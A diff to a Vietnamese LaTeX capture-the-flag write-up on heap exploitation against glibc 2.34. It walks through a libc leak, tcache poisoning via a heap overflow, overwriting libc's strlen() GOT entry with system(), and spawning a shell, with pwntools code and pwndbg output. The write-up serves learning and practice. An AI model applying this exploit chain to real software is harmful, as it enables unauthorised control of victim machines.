+►   0x15555522c000     0x155555399000 r-xp   16d000   2c000 libc.so.6
+►   0x155555399000     0x1555553ef000 r--p    56000  199000 libc.so.6
+►   0x1555553ef000     0x1555553f2000 r--p     3000  1ee000 libc.so.6
+►   0x1555553f2000     0x1555553f5000 rw-p     3000  1f1000 libc.so.6
+    0x1555553f5000     0x155555402000 rw-p     d000       0 [anon_1555553f5]
+pwndbg> p/x 0x00001555553f3041 - 0x155555200000
+$1 = 0x1f3041
+\end{lstlisting}
+
+Leak và tính libc base:
+
+\begin{lstlisting}[style=pythonstyle]
+libc.address = u64(show(b'\x06').ljust(8, b'\0')) - 0x1f3041
+print(f"libc base: {hex(libc.address)}")
+\end{lstlisting}
+
+Kết quả được xác nhận qua \texttt{vmmap} như dưới đây:
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=\linewidth]{images/image-17.png}
+\caption{Xác nhận libc base address}
+\end{figure}
+
 \subsection{Remote Code Execution}
+
+Sau khi đã leak được địa chỉ cơ sở của heap và của libc, vượt qua được cơ chế ASLR, kẻ tấn công có thể thực hiện nhiều kỹ thuật khác nhau tuỳ theo các cơ chế bảo vệ của binary hoặc của libc để spawn một interactive shell nhằm chiếm quyền điều khiển máy nạn nhân. Cụ thể trong trường hợp này, chúng ta sẽ lợi dụng lỗ hổng heap buffer overflow và địa chỉ cơ sở của heap để thực hiện kỹ thuật tấn công tcache poisoning, ghi đè con trỏ \texttt{fd} (next) của một chunk đã được free vào tcache bin, dẫn đến khả năng ghi và đọc địa chỉ tuỳ ý.
+
+Binary được bật Full RELRO nên không thể thực hiện GOT overwrite trong binary. Việc thực hiện ROP chain cũng phức tạp vì chưa leak được địa chỉ trên stack. Thực hiện hook overwrite đến \texttt{\_\_free\_hook} hoặc \texttt{\_\_malloc\_hook} cũng không khả thi vì glibc phiên bản 2.34 đã loại bỏ các hook này. Tuy nhiên, libc chỉ bật Partial RELRO nên phần GOT trong libc có thể bị overwrite.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{images/image-18.png}
+    \caption{Full RELRO trong binary và Partial RELRO trong libc}
+\end{figure}
+
+Có thể xem các GOT entry của libc bằng lệnh \texttt{got -p libc} trong pwndbg như sau:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{images/image-19.png}
+    \caption{Danh sách các GOT entry trong libc}
+\end{figure}
+
+Tuy nhiên, vấn đề là tại đây có rất nhiều GOT entry, không thể ghi đè ngẫu nhiên hay ghi đè toàn bộ được vì có thể làm crash chương trình. Do đó, cần quan sát lại mã giả để xác định các lời gọi hàm nhận vào tham số mà kẻ tấn công kiểm soát được, mà hàm đó gọi đến một trong các GOT entry của libc. Nếu kiểm soát tham số thành \texttt{/bin/sh} và ghi đè GOT entry tương ứng thành \texttt{system()}, lời gọi hàm đó sẽ trở thành \texttt{system("/bin/sh")}, từ đó spawn shell trên máy nạn nhân.
+
+Có một vài lời gọi hàm khả thi sau:
+
+\begin{itemize}
+    \item \texttt{strcpy(content, name);} trong hàm \texttt{create()}.
+    \item \texttt{free(MainTable[index]->content);} trong hàm \texttt{delete()}.
+    \item \texttt{puts((const char *)MainTable[index]->content + 8);} trong hàm \texttt{show()}.
+    \item Các lời gọi \texttt{strcpy()} tương tự trong \texttt{edit()}.
+\end{itemize}
+
+Tiến hành disassemble từng hàm:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{images/image-20.png}
+    \caption{Disassembly hàm \texttt{strcpy()}}
+\end{figure}
+
+Hàm \texttt{strcpy()} không sử dụng đến GOT entry nào.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{images/image-21.png}
+    \caption{Disassembly hàm \texttt{free()}}
+\end{figure}
+
+Hàm \texttt{free()} cũng vậy, không sử dụng GOT entry nào.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{images/image-22.png}
+    \caption{Disassembly hàm \texttt{puts()}}
+\end{figure}
+
+Trong \texttt{puts()} có một lời gọi đến PLT entry, vậy chắc chắn trong đó sẽ gọi đến một GOT entry tương ứng:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{images/image-23.png}
+    \caption{PLT entry trong \texttt{puts()}}
+\end{figure}
+
+Nằm tại địa chỉ \texttt{0x1555553f2098}, đó chính là GOT entry của \texttt{strlen()}:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{images/image-24.png}
+    \caption{GOT entry của \texttt{strlen()}}
+\end{figure}
+
+Vậy nếu ghi đè địa chỉ của hàm \texttt{system()} vào GOT entry này, lời gọi hàm\\\texttt{puts((const char *)MainTable[index]->content + 8);} trong \texttt{show()} với tham số là con trỏ trỏ đến \texttt{/bin/sh} sẽ trở thành \texttt{system("/bin/sh")}.
+
+Tiếp tục cấp phát 3 chunk như sau:
+
+\begin{lstlisting}[language=Python]
+create(b'\x17', 0x10, b'A')
+create(b'\x18', 0x60, b'A')
+create(b'\x19', 0x60, b'A')
+\end{lstlisting}
+
+Chunk 18 và 19 sẽ được đưa vào tcache bin, sau đó overflow từ chunk 17 để ghi đè con trỏ \texttt{fd} (next) của chunk 18 đến GOT entry của \texttt{strlen()}. Sau 2 lần cấp phát, sẽ có quyền ghi địa chỉ của hàm \texttt{system()} vào GOT entry.
+
+Vì trước đó đã corrupt heap và free một chunk có kích thước giả lớn vào unsorted bin để leak địa chỉ libc, các chunk cấp phát sau này sẽ được cắt từ chunk trong unsorted bin ra. Do sử dụng kích thước giả, việc cấp phát bị sai lệch càng khiến heap bị corrupt. Do đó, cần cấp phát 3 chunk 17, 18, 19 trước khi leak địa chỉ libc:
+
+\begin{lstlisting}[language=Python]
+create(b'\x05', 0x10, b'A')
+create(b'\x06', 0x60, b'A')
+create(b'\x07', 0x60, b'A')
+
+create(b'\x09', 0x60, b'A')
+create(b'\x10', 0x60, b'A')
+create(b'\x11', 0x60, b'A')
+create(b'\x12', 0x60, b'A')
+create(b'\x13', 0x60, b'A')
+create(b'\x14', 0x60, b'A')
+create(b'\x15', 0x60, b'A')
+create(b'\x16', 0x60, p64(0) * 4 + b'A')
+
+create(b'\x17', 0x10, b'A')
+create(b'\x18', 0x60, b'A')
+create(b'\x19', 0x60, b'A')
+
+edit(b'\x05', b'\x07\x00\x01', b'A' * 16 + p64(0x421))
+
+delete(b'\x06')
+create(b'\x06', 0x10, b'A')
+libc.address = u64(show(b'\x06').ljust(8, b'\0')) - 0x1f3041
+print(f"libc base: {hex(libc.address)}")
+\end{lstlisting}
+
+Tiếp tục cần tính toán con trỏ \texttt{fd} giả mạo để ghi đè. Vị trí GOT entry của \texttt{strlen()} có offset so với địa chỉ base của libc là:
+
+\begin{lstlisting}[language=bash]
+pwndbg> vmmap libc
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
+►   0x155555200000     0x15555522c000 r--p    2c000       0 libc.so.6
+►   0x15555522c000     0x155555399000 r-xp   16d000   2c000 libc.so.6
+►   0x155555399000     0x1555553ef000 r--p    56000  199000 libc.so.6
+►   0x1555553ef000     0x1555553f2000 r--p     3000  1ee000 libc.so.6
+►   0x1555553f2000     0x1555553f5000 rw-p     3000  1f1000 libc.so.6
+    0x1555553f5000     0x155555402000 rw-p     d000       0 [anon_1555553f5]
+pwndbg> p/x 0x1555553f2098 - 0x155555200000
+$2 = 0x1f2098
+\end{lstlisting}
+
+Vậy con trỏ \texttt{fd} có thể được tính toán như sau:
+
+\begin{lstlisting}[language=Python]
+strlen_got = (libc.address + 0x1f2098 - 0x8) ^ (heap_base >> 12)
+\end{lstlisting}
+
+Vì các chunk hợp lệ phải được cấp phát tại địa chỉ được căn chỉnh 16 byte (chia hết cho 16), cần trừ con trỏ đi \texttt{0x8}, và việc encode cũng cần phải thực hiện. Việc ghi nội dung vào offset +8 byte của content cũng phù hợp với việc căn chỉnh này.
+
+Tiếp theo, free 2 lần vào tcache bin: một chunk bất kỳ vào trước, chunk 18 vào sau.
+
+\begin{lstlisting}[language=Python]
+delete(b'\x15')
+delete(b'\x18')
+\end{lstlisting}
+
+Tcache hiện trông như sau:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{images/image-25.png}
+    \caption{Trạng thái tcache bin trước khi ghi đè}
+\end{figure}
+
+Chúng ta ghi đè con trỏ \texttt{fd}:
+
+\begin{lstlisting}[language=Python]
+edit(b'\x17', b'\x19\x00\x01', b'A' * 16 + p64(0x71) + p64(strlen_got))
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{images/image-26.png}
+    \caption{Chương trình bị crash với lỗi SIGSEGV}
+\end{figure}
+
+Cấp phát 2 lần để ghi địa chỉ system:
+
+\begin{lstlisting}[language=Python]
+create(b'\x18', 0x60, b'/bin/sh\0')
+create(b'\x15', 0x60, p64(libc.symbols['system']))
+\end{lstlisting}
+
+Tuy nhiên, chương trình crash ngay lập tức do lỗi SIGSEGV - truy cập bộ nhớ không hợp lệ:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{images/image-27.png}
+    \caption{Chương trình bị crash với lỗi SIGSEGV}
+\end{figure}
+
+Kiểm tra các GOT entry sau khi cấp phát và thấy entry của \texttt{strlen()} bị ghi thành NULL:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{images/image-28.png}
+    \caption{GOT entry của \texttt{strlen()} bị ghi đè thành NULL}
+\end{figure}
+
+Theo Perplexity, trên phiên bản glibc 2.34, chunk được lấy từ tcache bin khi cấp phát sẽ bị ptmalloc ghi đè 8 byte sau thành NULL, còn 8 byte đầu thì không bị ghi đè. Vì vậy, GOT entry ở trên \texttt{strncmp()} được ghi thành \texttt{\textbackslash x15\textbackslash x00} còn GOT entry của \texttt{strlen()} bị ghi thành NULL.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{images/image-29.png}
+    \caption{Hành vi của ptmalloc khi cấp phát từ tcache bin}
+\end{figure}
+
+Nhìn lại trong hàm \texttt{create()}, thấy \texttt{puts("Rune contents: ");} được gọi sau \texttt{malloc()} nhưng trước \texttt{read()}. Vậy \texttt{puts()} đã cố gắng truy cập hàm tại địa chỉ NULL để gọi \texttt{strlen()}, trước khi có thể ghi đè, dẫn đến lỗi SIGSEGV và crash chương trình.
+
+\begin{lstlisting}[language=C]
+content = (char *)malloc(length + 8);
+strcpy(MainTable[index]->name, name);
+MainTable[index]->content = content;
+MainTable[index]->length = length;
+strcpy(content, name);
+puts("Rune contents: ");
+read(0, content + 8, length);
+\end{lstlisting}
+
+Giải pháp là dịch con trỏ \texttt{fd} giả mạo đến địa chỉ thấp hơn để tránh ptmalloc ghi NULL vào GOT entry của \texttt{strlen()}, cụ thể dịch \texttt{0x10} byte về địa chỉ thấp hơn:
+
+\begin{lstlisting}[language=Python]
+strlen_got = (libc.address + 0x1f2098 - 0x8 - 0x10) ^ (heap_base >> 12)
+
+delete(b'\x15')
+delete(b'\x18')
+
+edit(b'\x17', b'\x19\x00\x01', b'A' * 16 + p64(0x71) + p64(strlen_got))
+
+create(b'\x18', 0x60, b'/bin/sh\0')
+create(b'\x15', 0x60, b'A' * 16 + p64(libc.symbols['system']))
+\end{lstlisting}
+
+Vậy chúng ta đã ghi đè thành công:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{images/image-30.png}
+    \caption{Ghi đè thành công GOT entry của \texttt{strlen()} với địa chỉ \texttt{system()}}
+\end{figure}
+
+Việc cuối cùng cần làm là gọi \texttt{show('\textbackslash x18')} để gọi \texttt{system('/bin/sh')}. Tuy nhiên, vì đã corrupt hàm \texttt{puts()}, mọi thứ in ra từ bây giờ sẽ là toàn các giá trị rác. Do đó, ta sử dụng hàm \texttt{recvrepeat()} để dọn dẹp dữ liệu nhận được:
+
+\begin{lstlisting}[language=Python]
+print("Spawning the shell:")
+
+sl(p, b'4')
+rr(p, 1)
+s(p, b'\x18')
+rr(p, 1)
+
+ia(p)
+\end{lstlisting}
+
+Vậy là đã thành công mở shell và chiếm quyền điều khiển máy nạn nhân.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{images/image-31.png}
+    \caption{Thành công mở shell và chiếm quyền điều khiển}
+\end{figure}
 
 \clearpage
 \section{Conclusion}
